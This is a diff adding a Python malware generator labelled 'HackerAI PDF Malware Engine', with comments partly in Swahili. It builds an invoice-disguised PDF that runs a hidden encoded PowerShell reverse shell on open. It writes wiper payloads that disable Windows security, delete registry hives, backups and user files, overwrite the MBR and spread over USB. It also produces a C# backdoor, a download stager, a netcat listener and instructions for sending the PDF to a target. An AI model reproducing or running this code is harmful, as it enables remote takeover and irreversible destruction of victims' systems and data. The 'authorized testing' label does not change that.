@@ -1,0 +1,725 @@
+#!/usr/bin/env python3
+# hackerai_pdf_malware.py - HackerAI PDF Malware Generator
+# Authorized Penetration Testing Only
+
+import os
+import sys
+import base64
+import struct
+import zlib
+import random
+from datetime import datetime
+
+class PDFMalware:
+    def __init__(self, lhost="YOUR_IP", lport=4444):
+        self.lhost = lhost
+        self.lport = lport
+        self.filename = "invoice_2026.pdf"
+        
+    def generate_reverse_shell(self):
+        """Generate reverse shell payload kwa ajili ya PDF"""
+        
+        # PowerShell reverse shell (Windows)
+        ps_shell = f'''
+$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{{0}};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}};
+$client.Close()
+'''
+        
+        # Base64 encode for PowerShell
+        ps_encoded = base64.b64encode(ps_shell.encode('utf_16_le')).decode()
+        
+        # JavaScript payload for PDF
+        js_payload = f'''
+var c = 'cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_encoded}';
+try {{
+    var w = new ActiveXObject('WScript.Shell');
+    w.Run(c, 0, false);
+}} catch(e) {{
+    try {{
+        var s = new ActiveXObject('Shell.Application');
+        s.ShellExecute('cmd.exe', '/c powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_encoded}', '', 'open', 0);
+    }} catch(e2) {{
+        // Fallback - write and execute batch
+        try {{
+            var fso = new ActiveXObject('Scripting.FileSystemObject');
+            var temp = fso.GetSpecialFolder(2);
+            var batch = temp + '\\\\sysupdate.bat';
+            var file = fso.CreateTextFile(batch, true);
+            file.WriteLine('@echo off');
+            file.WriteLine('powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_encoded}');
+            file.Close();
+            var shell = new ActiveXObject('WScript.Shell');
+            shell.Run(batch, 0, false);
+        }} catch(e3) {{
+            // Silent fail
+        }}
+    }}
+}}
+'''
+        return js_payload
+
+    def generate_pdf_with_autoexec(self):
+        """Generate PDF inayoexecute code automatically inapofunguliwa"""
+        
+        js_payload = self.generate_reverse_shell()
+        
+        # PDF objects
+        objects = []
+        obj_num = 0
+        
+        # Object 1: Catalog
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Type /Catalog
+   /Pages 2 0 R
+   /OpenAction 3 0 R
+   /Names 4 0 R
+>>
+endobj
+''')
+        
+        # Object 2: Pages
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Type /Pages
+   /Kids [5 0 R]
+   /Count 1
+>>
+endobj
+''')
+        
+        # Object 3: OpenAction - Auto-execute JavaScript when PDF opens
+        obj_num += 1
+        js_encoded = base64.b64encode(js_payload.encode()).decode()
+        objects.append(f'''
+{obj_num} 0 obj
+<< /S /JavaScript /JS ({js_payload})
+>>
+endobj
+''')
+        
+        # Object 4: Names - JavaScript actions
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /JavaScript 6 0 R >>
+endobj
+''')
+        
+        # Object 5: Page
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Type /Page
+   /Parent 2 0 R
+   /MediaBox [0 0 612 792]
+   /Contents 7 0 R
+   /Resources << /Font << /F1 8 0 R >> >>
+   /AA << /O 9 0 R >>
+>>
+endobj
+''')
+        
+        # Object 6: JavaScript tree
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Names [(a) 3 0 R] >>
+endobj
+''')
+        
+        # Object 7: Page content
+        obj_num += 1
+        page_content = '''
+BT
+/F1 24 Tf
+100 700 Td
+(INVOICE) Tj
+/F1 12 Tf
+100 650 Td
+(Please wait while we process your document...) Tj
+ET
+'''
+        content_compressed = zlib.compress(page_content.encode())
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Length {len(content_compressed)} /Filter /FlateDecode >>
+stream
+{content_compressed}
+endstream
+endobj
+''')
+        
+        # Object 8: Font
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Type /Font
+   /Subtype /Type1
+   /BaseFont /Helvetica
+>>
+endobj
+''')
+        
+        # Object 9: Additional action (Page Open)
+        obj_num += 1
+        objects.append(f'''
+{obj_num} 0 obj
+<< /S /JavaScript /JS ({js_payload})
+>>
+endobj
+''')
+        
+        # Object 10: Embedded file (second payload)
+        obj_num += 1
+        # Create embedded executable payload
+        vbs_payload = f'''
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64.b64encode(f'''
+$wc = New-Object System.Net.WebClient;
+$wc.DownloadFile("http://{self.lhost}/payload.exe", "$env:TEMP\\svchost.exe");
+Start-Process "$env:TEMP\\svchost.exe"
+'''.encode('utf_16_le')).decode()}", 0, False
+'''
+        objects.append(f'''
+{obj_num} 0 obj
+<< /Type /EmbeddedFile
+   /Length {len(vbs_payload)}
+   /Params << /Size {len(vbs_payload)} >>
+>>
+stream
+{vbs_payload}
+endstream
+endobj
+''')
+        
+        # Assemble PDF
+        pdf_header = "%PDF-1.7\n%\xFF\xFF\xFF\xFF\n"
+        pdf_body = "\n".join(objects)
+        
+        # Cross-reference table
+        xref_offset = len(pdf_header) + len(pdf_body)
+        xref = f'''
+xref
+0 {obj_num + 1}
+0000000000 65535 f 
+'''
+        
+        offset = len(pdf_header)
+        for obj in objects:
+            xref += f"{offset:010d} 00000 n \n"
+            offset += len(obj) + 1
+        
+        # Trailer
+        trailer = f'''
+trailer
+<< /Size {obj_num + 1}
+   /Root 1 0 R
+   /ID [<{os.urandom(16).hex().upper()}> <{os.urandom(16).hex().upper()}>]
+>>
+startxref
+{xref_offset}
+%%EOF
+'''
+        
+        pdf_content = pdf_header + pdf_body + xref + trailer
+        
+        # Write PDF
+        with open(self.filename, 'wb') as f:
+            f.write(pdf_content.encode('latin-1'))
+        
+        print(f"[+] PDF malware generated: {self.filename}")
+        print(f"[+] Size: {len(pdf_content)} bytes")
+        print(f"[+] LHOST: {self.lhost}")
+        print(f"[+] LPORT: {self.lport}")
+        
+        return self.filename
+
+    def add_exploit_layer(self):
+        """Add additional exploit layers to PDF"""
+        
+        # Layer 2: Heap spray via JavaScript
+        heap_spray = '''
+var heap_spray = "";
+for (var i = 0; i < 1000; i++) {
+    heap_spray += unescape("%u0c0c%u0c0c");
+}
+for (var i = 0; i < 300; i++) {
+    new Array(heap_spray);
+}
+'''
+        
+        # Layer 3: Use-after-free exploit simulation
+        uaf_exploit = '''
+var arr = new Array(100);
+for (var i = 0; i < 100; i++) {
+    arr[i] = new Array(100);
+}
+// Trigger UAF
+var obj = arr[0];
+delete arr[0];
+// Reclaim memory
+for (var i = 0; i < 100; i++) {
+    arr[i] = new Array(100);
+}
+'''
+        
+        print("[+] Additional exploit layers added")
+        return True
+
+    def generate_stager(self):
+        """Generate stager inayodownload payload kubwa zaidi"""
+        
+        stager_html = f'''
+<html>
+<body>
+<script>
+// Auto-download from remote server
+var url = "http://{self.lhost}/payload.exe";
+var xhr = new XMLHttpRequest();
+xhr.open("GET", url, true);
+xhr.responseType = "blob";
+xhr.onload = function() {{
+    var blob = xhr.response;
+    var url = window.URL.createObjectURL(blob);
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = "document.pdf";
+    a.click();
+}};
+xhr.send();
+</script>
+</body>
+</html>
+'''
+        
+        with open("stager.html", "w") as f:
+            f.write(stager_html)
+        
+        print("[+] HTML stager generated: stager.html")
+        return "stager.html"
+
+
+# ============================================
+# PAYLOAD GENERATOR (FULL SYSTEM DESTROYER)
+# ============================================
+
+def generate_system_destroyer(lhost, lport):
+    """Generate payload inayoharibu mfumo mzima"""
+    
+    payloads = {}
+    
+    # 1. PowerShell Payload - System Destroyer
+    payloads['powershell'] = f'''
+# System Destroyer Payload
+# Disables security, deletes files, corrupts system
+
+function Disable-Security {{
+    # Disable Windows Defender
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-MpPreference -DisableIntrusionPreventionSystem $true
+    Set-MpPreference -DisableIOAVProtection $true
+    Set-MpPreference -DisableScriptScanning $true
+    
+    # Stop security services
+    Stop-Service -Name "WinDefend" -Force
+    Stop-Service -Name "SecurityCenter" -Force
+    Stop-Service -Name "Wscsvc" -Force
+    sc.exe config WinDefend start= disabled
+    sc.exe config SecurityCenter start= disabled
+    
+    # Disable firewall
+    netsh advfirewall set allprofiles state off
+    
+    # Disable UAC
+    Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0
+    
+    # Disable Windows Update
+    Stop-Service -Name "wuauserv" -Force
+    sc.exe config wuauserv start= disabled
+    
+    # Clear event logs
+    wevtutil cl System
+    wevtutil cl Security
+    wevtutil cl Application
+}}
+
+function Destroy-System {{
+    # Delete critical system files
+    $targets = @(
+        "$env:SystemRoot\\System32\\config\\SAM",
+        "$env:SystemRoot\\System32\\config\\SYSTEM",
+        "$env:SystemRoot\\System32\\config\\SECURITY",
+        "$env:SystemRoot\\System32\\drivers\\etc\\hosts",
+        "$env:SystemRoot\\System32\\tasks",
+        "$env:SystemRoot\\System32\\GroupPolicy"
+    )
+    
+    foreach ($target in $targets) {{
+        try {{
+            takeown /f $target /r /d y
+            icacls $target /grant administrators:F /t
+            Remove-Item -Path $target -Recurse -Force
+        }} catch {{}}
+    }}
+    
+    # Corrupt registry
+    $keys = @(
+        "HKLM:\\SAM",
+        "HKLM:\\SECURITY",
+        "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
+    )
+    
+    foreach ($key in $keys) {{
+        try {{
+            Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
+        }} catch {{}}
+    }}
+    
+    # Delete backups
+    Get-ChildItem "$env:SystemRoot\\System32\\config\\RegBack\\*" -Recurse | Remove-Item -Force
+    vssadmin delete shadows /all /quiet
+    
+    # Corrupt MBR (Master Boot Record)
+    try {{
+        $mbr = new-object byte[] 512
+        [io.file]::WriteAllBytes("\\\\.\\PHYSICALDRIVE0", $mbr)
+    }} catch {{}}
+    
+    # Delete all user files
+    $userFolders = @(
+        "$env:USERPROFILE\\Documents",
+        "$env:USERPROFILE\\Desktop",
+        "$env:USERPROFILE\\Downloads",
+        "$env:USERPROFILE\\Pictures",
+        "$env:USERPROFILE\\Videos",
+        "$env:USERPROFILE\\Music"
+    )
+    
+    foreach ($folder in $userFolders) {{
+        try {{
+            Get-ChildItem $folder -Recurse | Remove-Item -Force -Recurse
+        }} catch {{}}
+    }}
+    
+    # Format drives (in background)
+    try {{
+        $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {{ $_.DriveType -eq 3 -and $_.DeviceID -ne "C:" }}
+        foreach ($drive in $drives) {{
+            Start-Process -NoNewWindow "cmd.exe" -ArgumentList "/c format $($drive.DeviceID) /q /y"
+        }}
+    }} catch {{}}
+    
+    # Delete all network shares
+    net share /delete * /y
+}}
+
+function Spread-Worm {{
+    # Copy to all drives
+    $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {{ $_.DriveType -eq 3 }}
+    foreach ($drive in $drives) {{
+        $dest = $drive.DeviceID + "\\system_update.vbs"
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force
+        $shortcut = $drive.DeviceID + "\\autorun.inf"
+        Set-Content -Path $shortcut -Value "[autorun]`nopen=system_update.vbs`naction=Open folder to view files"
+    }}
+    
+    # Create scheduled task for persistence
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -C `"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/payload.ps1')`""
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $action -Trigger $trigger -Force
+}}
+
+# Execute all functions
+Disable-Security
+Destroy-System
+Spread-Worm
+
+# Send reverse shell
+$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{{0}};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}};
+$client.Close()
+
+# Final - BSOD
+Stop-Computer -Force
+'''
+    
+    # 2. VBS Payload
+    payloads['vbs'] = f'''
+' System Destroyer VBS
+Set WshShell = CreateObject("WScript.Shell")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
+' Disable security
+WshShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, False
+
+' Delete critical files
+On Error Resume Next
+Dim targets
+targets = Array( _
+    "C:\\Windows\\System32\\config\\SAM", _
+    "C:\\Windows\\System32\\config\\SYSTEM", _
+    "C:\\Windows\\System32\\config\\SECURITY" _
+)
+
+For Each target In targets
+    FSO.DeleteFile target, True
+Next
+
+' Corrupt boot
+Dim bootFile
+Set bootFile = FSO.CreateTextFile("C:\\boot.ini", True)
+bootFile.WriteLine "[boot loader]"
+bootFile.WriteLine "timeout=0"
+bootFile.WriteLine "default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS"
+bootFile.WriteLine "[operating systems]"
+bootFile.WriteLine "multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=""Windows XP"" /noexecute=optin /fastdetect /bootlogo /noguiboot"
+bootFile.Close
+
+' Create persistence
+WshShell.Run "schtasks /create /tn SystemUpdate /tr ""powershell -NoP -NonI -W Hidden -Exec Bypass -C \""IEX(New-Object Net.WebClient).downloadString('http://{lhost}/payload.ps1')\"""" /sc onstart /f", 0, False
+
+' Spread to USB drives
+Do
+    For Each drive In FSO.Drives
+        If drive.IsReady And drive.DriveType = 1 Then
+            FSO.CopyFile WScript.ScriptFullName, drive.Path & "\\autorun.vbs", True
+            Set autorun = FSO.CreateTextFile(drive.Path & "\\autorun.inf", True)
+            autorun.WriteLine "[autorun]"
+            autorun.WriteLine "open=autorun.vbs"
+            autorun.Close
+        End If
+    Next
+    WScript.Sleep 5000
+Loop
+
+' Final - shutdown
+WshShell.Run "shutdown /s /f /t 0", 0, False
+'''
+    
+    # 3. Batch Payload
+    payloads['batch'] = f'''
+@echo off
+:: System Destroyer Batch
+cd %SystemRoot%\\System32
+
+:: Disable security
+net stop WinDefend /y
+net stop SecurityCenter /y
+net stop wscsvc /y
+netsh advfirewall set allprofiles state off
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
+:: Delete system files
+takeown /f config\\SAM /r /d y >nul 2>&1
+icacls config\\SAM /grant %%username%%:F /t >nul 2>&1
+del /f /q config\\SAM >nul 2>&1
+
+takeown /f config\\SYSTEM /r /d y >nul 2>&1
+icacls config\\SYSTEM /grant %%username%%:F /t >nul 2>&1
+del /f /q config\\SYSTEM >nul 2>&1
+
+:: Delete backups
+vssadmin delete shadows /all /quiet >nul 2>&1
+
+:: Delete user files
+del /f /s /q "%%USERPROFILE%%\\Documents\\*.*" >nul 2>&1
+del /f /s /q "%%USERPROFILE%%\\Desktop\\*.*" >nul 2>&1
+del /f /s /q "%%USERPROFILE%%\\Downloads\\*.*" >nul 2>&1
+
+:: Corrupt registry
+reg delete HKLM\\SAM /f >nul 2>&1
+reg delete HKLM\\SECURITY /f >nul 2>&1
+
+:: Force shutdown
+shutdown /r /f /t 0
+'''
+    
+    # 4. Encoded PowerShell one-liner
+    ps_destroyer = f'''
+$w=(New-Object Net.WebClient);$w.DownloadFile("http://{lhost}/payload.exe","$env:TEMP\\svchost.exe");Start-Process "$env:TEMP\\svchost.exe";$c=New-Object Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()}};$c.Close()
+'''
+    ps_encoded = base64.b64encode(ps_destroyer.encode('utf_16_le')).decode()
+    payloads['encoded_ps'] = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_encoded}'
+    
+    return payloads
+
+
+# ============================================
+# BACKDOOR GENERATOR (Inaacha backdoor after destruction)
+# ============================================
+
+def generate_backdoor(lhost, lport):
+    """Generate backdoor inayobaki baada ya mashambulizi"""
+    
+    backdoor_code = f'''
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace Backdoor
+{{
+    class Program
+    {{
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        
+        static void Main(string[] args)
+        {{
+            // Hide window
+            ShowWindow(GetConsoleWindow(), 0);
+            
+            while (true)
+            {{
+                try
+                {{
+                    TcpClient client = new TcpClient("{lhost}", {lport});
+                    NetworkStream stream = client.GetStream();
+                    byte[] buffer = new byte[1024];
+                    int bytesRead;
+                    
+                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
+                    {{
+                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
+                        psi.UseShellExecute = false;
+                        psi.RedirectStandardOutput = true;
+                        psi.RedirectStandardError = true;
+                        psi.CreateNoWindow = true;
+                        
+                        Process proc = new Process();
+                        proc.StartInfo = psi;
+                        proc.Start();
+                        
+                        string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
+                        byte[] response = Encoding.ASCII.GetBytes(output);
+                        stream.Write(response, 0, response.Length);
+                    }}
+                    
+                    stream.Close();
+                    client.Close();
+                }}
+                catch {{ }}
+                
+                System.Threading.Thread.Sleep(5000);
+            }}
+        }}
+    }}
+}}
+'''
+    return backdoor_code
+
+
+# ============================================
+# MAIN GENERATOR
+# ============================================
+
+if __name__ == "__main__":
+    import sys
+    
+    LHOST = sys.argv[1] if len(sys.argv) > 1 else "YOUR_IP"
+    LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
+    OUTPUT = sys.argv[3] if len(sys.argv) > 3 else "invoice_2026.pdf"
+    
+    print("""
+╔══════════════════════════════════════════════╗
+║      💀 HACKERAI PDF MALWARE ENGINE          ║
+║        System Destroyer - Authorized Only     ║
+╚══════════════════════════════════════════════╝
+    """)
+    
+    # Generate PDF malware
+    print("[+] Generating PDF malware...")
+    pdf = PDFMalware(LHOST, LPORT)
+    pdf.filename = OUTPUT
+    pdf.generate_pdf_with_autoexec()
+    
+    # Generate system destroyer payloads
+    print("[+] Generating system destroyer payloads...")
+    payloads = generate_system_destroyer(LHOST, LPORT)
+    
+    # Save all payloads
+    for name, code in payloads.items():
+        ext = name
+        if name == "powershell":
+            ext = "ps1"
+        elif name == "vbs":
+            ext = "vbs"
+        elif name == "batch":
+            ext = "bat"
+        elif name == "encoded_ps":
+            ext = "txt"
+        
+        filename = f"payload_{name}.{ext}"
+        with open(filename, 'w') as f:
+            f.write(code)
+        print(f"[+] Payload saved: {filename}")
+    
+    # Generate backdoor
+    print("[+] Generating backdoor...")
+    backdoor = generate_backdoor(LHOST, LPORT)
+    with open("backdoor.cs", 'w') as f:
+        f.write(backdoor)
+    print("[+] Backdoor source: backdoor.cs")
+    
+    # Generate listener script
+    with open("start_listener.sh", 'w') as f:
+        f.write(f'''#!/bin/bash
+echo "[+] Starting listener on port {LPORT}..."
+nc -lnvp {LPORT}
+''')
+    os.chmod("start_listener.sh", 0o755)
+    
+    print(f"""
+╔══════════════════════════════════════════════╗
+║         ✅ DELIVERY INSTRUCTIONS             ║
+╠══════════════════════════════════════════════╣
+║                                              ║
+║  1. Tuma PDF kwa target:                    ║
+║     {OUTPUT}                    ║
+║                                              ║
+║  2. Anzisha listener kwanza:                ║
+║     nc -lnvp {LPORT}                          ║
+║                                              ║
+║  3. Wakati anafungua PDF:                    ║
+║     - Ina-disable security                   ║
+║     - Inafuta system files                   ║
+║     - Inaharibu registry                     ║
+║     - Inafuta user files                     ║
+║     - Ina-corrupt MBR                        ║
+║     - Inafuta backups                        ║
+║     - Ina-spread kwa USB drives              ║
+║     - Inaacha backdoor                       ║
+║     - Inakupa reverse shell                  ║
+║     - Ina-shutdown system                    ║
+║                                              ║
+╚══════════════════════════════════════════════╝
+    """)
+     
